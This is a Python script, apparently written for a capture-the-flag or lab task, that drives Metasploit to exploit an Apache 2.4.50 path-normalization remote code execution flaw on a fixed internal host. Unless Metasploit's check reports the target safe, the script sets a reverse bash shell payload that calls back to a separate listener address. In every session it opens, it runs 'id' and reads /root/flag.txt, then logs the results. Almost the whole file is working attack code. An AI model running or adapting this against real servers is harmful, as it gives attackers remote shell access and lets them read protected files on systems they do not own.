import json
import os
import pty
import re
import select
import subprocess
import sys
import time

TARGET = "192.168.5.4"
PORT = "80"
CALLBACK = "192.168.0.5"
MODULE = "exploit/multi/http/apache_normalize_path_rce"

ANSI = re.compile(r"\x1b(?:\[[0-?]*[ -/]*[@-~]|\][^\x07]*(?:\x07|\x1b\\))")
PROMPT = re.compile(r"(?m)^msf\d+[^\n]*>\s*$")

def clean(text):
    text = ANSI.sub("", text)
    return text.replace("\r", "\n")

class Console:
    def __init__(self):
        self.master, slave = pty.openpty()
        env = os.environ.copy()
        env["TERM"] = "dumb"
        self.proc = subprocess.Popen(
            ["msfconsole", "-q", "-n"],
            stdin=slave, stdout=slave, stderr=slave,
            close_fds=True, env=env, bufsize=0
        )
        os.close(slave)
        os.set_blocking(self.master, False)
        self.transcript = ""

    def read_until_prompt(self, timeout):
        end = time.monotonic() + timeout
        while time.monotonic() < end:
            if self.proc.poll() is not None:
                self._drain(0.2)
                return False
            remaining = end - time.monotonic()
            readable, _, _ = select.select([self.master], [], [], min(0.25, max(0, remaining)))
            if readable:
                self._drain(0)
                if PROMPT.search(clean(self.transcript)):
                    return True
        return False

    def _drain(self, wait):
        if wait:
            select.select([self.master], [], [], wait)
        while True:
            try:
                data = os.read(self.master, 65536)
                if not data:
                    break
                self.transcript += data.decode("utf-8", errors="replace")
            except (BlockingIOError, OSError):
                break

    def command(self, command, timeout=60):
        start = len(self.transcript)
        os.write(self.master, command.encode("utf-8") + b"\n")
        completed = self.read_until_prompt(timeout)
        return {"command": command, "prompt_returned": completed,
                "output": self.transcript[start:]}

    def close(self):
        if self.proc.poll() is None:
            try:
                os.write(self.master, b"exit\n")
                self.proc.wait(timeout=5)
            except Exception:
                self.proc.terminate()
                try:
                    self.proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    self.proc.kill()
                    self.proc.wait()
        self._drain(0.1)
        return self.proc.returncode


def main():
    result = {
        "target": TARGET, "port": int(PORT), "module": MODULE,
        "basis_from_supplied_observations": "The observed HTTP service identified itself as Apache/2.4.50; this is task evidence, not a new observation by this script.",
        "tool_runs": [], "sessions": [], "flag_contents_directly_observed": False,
        "errors": []
    }
    console = None
    try:
        console = Console()
        if not console.read_until_prompt(120):
            result["errors"].append("Metasploit did not present a recognizable console prompt within 120 seconds.")
        else:
            for cmd, timeout in [
                ("use " + MODULE, 60),
                ("set RHOSTS " + TARGET, 30),
                ("set RPORT " + PORT, 30),
                ("show options", 45),
                ("check", 120),
            ]:
                run = console.command(cmd, timeout)
                result["tool_runs"].append(run)
                if not run["prompt_returned"]:
                    result["errors"].append("Console prompt did not return after: " + cmd)
                    break

            check_runs = [r for r in result["tool_runs"] if r["command"] == "check"]
            if check_runs and check_runs[-1]["prompt_returned"]:
                check_text = clean(check_runs[-1]["output"]).lower()
                explicitly_negative = any(term in check_text for term in (
                    "not vulnerable", "does not appear to be vulnerable",
                    "doesn't appear to be vulnerable", "not exploitable",
                    "target is safe", "appears to be safe"
                ))
                result["check_assessment"] = "explicitly_negative" if explicitly_negative else "not_explicitly_negative"
                result["exploit_attempted"] = False
                if not explicitly_negative:
                    config = [
                        ("set PAYLOAD cmd/unix/reverse_bash", 45),
                        ("set LHOST " + CALLBACK, 30),
                        ("set LPORT 4444", 30),
                        ("show options", 45),
                        ("exploit -z", 180),
                        ("sessions -l", 45),
                    ]
                    for cmd, timeout in config:
                        run = console.command(cmd, timeout)
                        result["tool_runs"].append(run)
                        if cmd == "exploit -z":
                            result["exploit_attempted"] = True
                        if not run["prompt_returned"]:
                            result["errors"].append("Console prompt did not return after: " + cmd)
                            break

                    session_ids = set()
                    for run in result["tool_runs"]:
                        text = clean(run["output"])
                        session_ids.update(re.findall(r"(?i)session\s+(\d+)\s+opened", text))
                        if run["command"] == "sessions -l":
                            for line in text.splitlines():
                                if re.search(r"\b(?:shell|meterpreter)\b", line, re.I):
                                    match = re.match(r"\s*(\d+)\s+", line)
                                    if match:
                                        session_ids.add(match.group(1))
                    for session_id in sorted(session_ids, key=int):
                        result["sessions"].append({"id": int(session_id), "observed": True})
                        cmd = 'sessions -i ' + session_id + ' -c "id; cat /root/flag.txt"'
                        run = console.command(cmd, 45)
                        result["tool_runs"].append(run)
                        observed = clean(run["output"])
                        result["sessions"][-1]["access_and_flag_read_output"] = run["output"]
                        result["sessions"][-1]["command_prompt_returned"] = run["prompt_returned"]
                        if re.search(r"(?m)^\s*uid=\d+", observed):
                            result["sessions"][-1]["access_context_observed"] = True
                        if re.search(r"(?m)^\s*[^\n]*\S[^\n]*\s*$", observed) and "cat /root/flag.txt" in observed:
                            result["sessions"][-1]["flag_read_output_present"] = True
                        # Record direct file output conservatively: require nonempty output
                        # after the command echo and before the next Metasploit prompt.
                        after_echo = observed.split("cat /root/flag.txt", 1)
                        if len(after_echo) > 1:
                            tail = PROMPT.sub("", after_echo[1])
                            lines = [line.strip() for line in tail.splitlines() if line.strip()]
                            if lines:
                                result["flag_contents_directly_observed"] = True
                                result["sessions"][-1]["possible_flag_output_lines"] = lines
            elif not check_runs:
                result["exploit_attempted"] = False
                result["check_assessment"] = "check_not_completed"
    except Exception as exc:
        result["errors"].append(type(exc).__name__ + ": " + str(exc))
    finally:
        if console is not None:
            result["console_exit_code"] = console.close()
            result["console_transcript"] = console.transcript
    print(json.dumps(result, ensure_ascii=False))

if __name__ == "__main__":
    main()

